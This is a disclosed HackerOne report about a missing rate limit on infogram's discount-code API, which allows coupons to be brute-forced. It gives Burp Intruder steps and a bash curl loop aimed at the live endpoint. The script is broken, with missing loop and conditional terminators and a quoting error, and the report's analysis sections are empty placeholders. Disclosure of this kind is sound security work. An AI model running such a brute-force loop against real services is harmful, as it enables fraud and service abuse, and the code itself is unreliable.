---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '288846'
original_report_id: '288846'
title: Bruteforcing Coupons
team_handle: infogram
created_at: '2017-11-09T15:57:10.803Z'
disclosed_at: '2017-12-12T19:48:01.100Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
asset_identifier: infogram.com
asset_type: URL
max_severity: critical
tags:
- hackerone
---

# Bruteforcing Coupons

## Metadata

- HackerOne Report ID: 288846
- Weakness: 
- Program: infogram
- Disclosed At: 2017-12-12T19:48:01.100Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,

while i was fuzzing for an API endpoints i found this endpoint: https://infogram.com/api/discounts
the first thing came on my mind is bruteforcing the coupon codes so i gave it a try and it worked!
there's no rate limit on that endpoint so an attacker could use it to bruteforce the coupon codes and filter the results to snipe the "valid":true response

##Steps to reproduce:

+ intercept the request using burpsuite or any proxy tool you would like to use

+ send the request to the intruder

+ configure the payload position

     {F238091}

+ start the attack

i wrote a simple script in bash to do the operation

```

#!/bin/bash

while [ 1 ]
do

  coupon=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 6 | head -n 1)
  curl=$(curl -i -s -k  -X $'GET' \
    -H $'X-Requested-With: XMLHttpRequest' \
    -b $'Cookies:XXXXXXX' \
    $'https://infogram.com/api/discounts/$coupon')

  if [[ $curl == *"valid":true* ]]
    echo "$coupon is valid";
  else
    echo "$coupon is invalid";
  
break;

```

Thanks.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
